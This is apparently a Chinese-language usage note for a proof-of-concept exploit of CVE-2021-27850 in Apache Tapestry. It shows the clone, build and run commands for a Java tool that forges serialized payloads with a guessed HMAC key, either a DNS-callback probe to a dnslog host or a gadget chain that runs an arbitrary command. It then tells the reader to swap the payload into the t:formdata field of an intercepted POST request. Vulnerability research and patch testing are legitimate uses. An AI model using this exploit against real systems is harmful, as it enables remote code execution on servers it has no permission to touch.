
## 命令使用
```bash
git clone https://github.com/Ovi3/CVE_2021_27850_POC.git
cd CVE_2021_27850_POC/
gradlew runnbaleJar

java -jar ./build/libs/CVE_2021_27850_POC-1.0-SNAPSHOT.jar
[Usage]:
        java TapestryExploit [Tapestry Key] DNS [URL]
        java TapestryExploit [Tapestry Key] CB2 [Command]

# 假设 hmac key为 change this immediately 
java -jar ./build/libs/CVE_2021_27850_POC-1.0-SNAPSHOT.jar "change this immediately" DNS "http://xxx.dnslog.cn"
java -jar ./build/libs/CVE_2021_27850_POC-1.0-SNAPSHOT.jar "change this immediately" CB2 "calc"
```

## 漏洞复现
访问Tapestry应用，触发一个POST请求（如登录请求），抓包，修改`t:formdata`参数值为上面生成的payload